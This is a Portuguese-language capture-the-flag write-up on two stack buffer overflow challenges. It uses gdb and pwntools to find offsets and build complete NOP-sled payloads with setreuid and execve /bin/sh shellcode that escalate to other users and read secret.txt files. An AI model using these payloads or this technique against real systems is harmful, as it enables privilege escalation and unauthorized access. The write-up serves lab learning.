# Buffer Overflow 1
###### Written by @Juh-s
>These are challenges about Buffer Overflows
## Definição

Um buffer overflow é uma falha de segurança quando um programa tenta escrever mais dados em um "buffer" (uma área de memória) do que ele pode conter.
Isso faz com que os dados "a mais" sobrescrevam áreas de memória adjacentes, corrompendo dados, causando falhas no programa ou permitindo que um atacante execute código malicioso para assumir o controle do sistema.

**Funcionamento:**

* `Buffer`: Um espaço de memória reservado para armazenar dados temporariamente, como informações de entrada de um usuário.

* `Overflow`: Ocorre quando um programa, talvez por um erro de programação, tenta colocar mais dados no buffer do que o tamanho definido.

* `Sobrescrita`: Os dados extras não são descartados, mas escrevem sobre o que estava na memória ao lado do buffer.

* `Exploração maliciosa`: Alguém mal intencionado pode explorar isso enviando dados especialmente elaborados que contêm código malicioso. Quando o buffer "transborda" ele pode sobrescrever o endereço de retorno do programa, redirecionando a execução para o código do atacante. 

## Buffer Overflows

**Objetivo**

* Use o método acima para abrir um shell e ler o conteúdo do arquivo `secret.txt`.

**Solução**

Para resolver esse desafio, irei utilizar o gdb.

Primeiro, examinamos o binário usando gdb e verificamos quantos bytes precisamos para sobrecarregar o endereço de retorno.

A partir dele, podemos dizer que o buffer possui 140 bytes de comprimento. Além disso, precisamos de um endereço de retorno de 6 bytes e do preenchimento de 8 bytes que existe em sistemas x64. Totalizando 154 bytes aproximadamente.

Porém, ao fazer o teste, apenas 2 bytes foram escritos no endereço de retorno e como precisamos de 6, é necessário adicionar mais 4 bytes.

<img width="920" height="611" alt="image" src="https://github.com/user-attachments/assets/05e0dc69-e2a8-4d98-8a12-7236e47f4376" />

Então, reescrevemos com 158 bytes.

Além disso, o texto deve ser acessado pelo `user2`. Portanto, devemos adicionar um pedaço de código ao nosso código que mudará nosso id. Para isso, usarei pwntools.

Para descobrir o id do user2 eu usei: `id -u user2`.

<img width="592" height="67" alt="image" src="https://github.com/user-attachments/assets/e6c34d11-ddf6-4e0d-affe-8ada6963c200" />

O próximo comando é o seguinte: `pwn shellcraft -f d amd64.linux.setreuid 1002`

Com isso, podemos adicioná-lo ao nosso código e procurar o endereço de retorno do nosso código shell no gdb.

O payload que irei usar é o seguinte: `| NOPs 90 | Shellcode 54 | random characters 8 | return address 6|` e depois disso, verificarei o registro para ver onde o código shell começa.

`run $(python -c "print('\x90' * 76 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 22 + 'B' * 6)")

x/100x $rsp-200`

A seguinte imagem mostra onde os NOPs começam, o código shell e endereço de retorno. Além disso, usaremos 0x7fffffffe298 como endereço de retorno. Convertendo para uma strign hexadecimal, temos: '\x98\xe2\xff\xff\xff\x7f'.

<img width="503" height="407" alt="image" src="https://github.com/user-attachments/assets/fca7110d-507d-4166-85f9-e4b45f8c8498" />

Por fim, podemos adicionar isso, sair do gdb e executar o binário com nosso payload: `python -c "print('\x90' * 76 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 22 + '\x98\xe2\xff\xff\xff\x7f')"`.

Depois de acessar o user2, basta ler o arquivo com o comando: `cat secret.txt`.

>`omgyoudidthissocool!!`

## Buffer Overflows

**Objetivo**

* Use o mesmo método que foi usado anteriormente para ler o conteúdo do aquivo secreto.

**Solução**

Podemos usar o mesmo método para resolver esse desafio, porém será necessário modificar um pouco o código shell.

Ao observar o binário, é possível ver que o nosso buffer agora tem 154 bytes de comprimento e é preenchido com a palavra `.doggo`

<img width="843" height="431" alt="image" src="https://github.com/user-attachments/assets/4dd8887d-3893-401a-ae93-31e3c09ed01d" />

Seguindo o mesmo passo de verificar qual o tamanho necessário para o nosso payload usando o gdb temos que:

<img width="913" height="522" alt="image" src="https://github.com/user-attachments/assets/2904eb37-bcae-4f19-a259-cf4bc9c740c5" />

Fazendo esse teste com 168 e 169 bytes, podemos ver que o nosso payload deverá ter 169 bytes dessa vez.

Além disso, adicionaremos um pedaço de código para alterar o nosso id para o id do user3 (usando o mesmo código `id -u user3` para encontrá-lo).

<img width="559" height="178" alt="image" src="https://github.com/user-attachments/assets/2e78f884-d2ef-4fcb-8731-982d978ac729" />

O código adicionado será novamente: pwn shellcraft -f d amd64.linux.setreuid 1003

E então, devemos encontrar o código shell novamente como foi feito no outro exercício.

`run $(python -c "print('\x90' * 100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 9 + 'B' * 6)")`

<img width="931" height="786" alt="image" src="https://github.com/user-attachments/assets/df775898-6750-4878-9cb8-4aac33e8d4f0" />

Sabendo onde o código começa, é possível usar o mesmo endereço de registro: 0x7fffffffe298, traduzido para \x98\xe2\xff\xff\xff\x7f

Por fim, basta substituir no payload e executar o binário com esse endereço para encontrarmos o shell como user3.

`python -c "print('\x90' * 100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 9 + '\x98\xe2\xff\xff\xff\x7f')"`

Acessando novamente o arquivo `secret.txt` usando o comando `cat` e estando conectado no user3 temos:

>`wowanothertime!!`
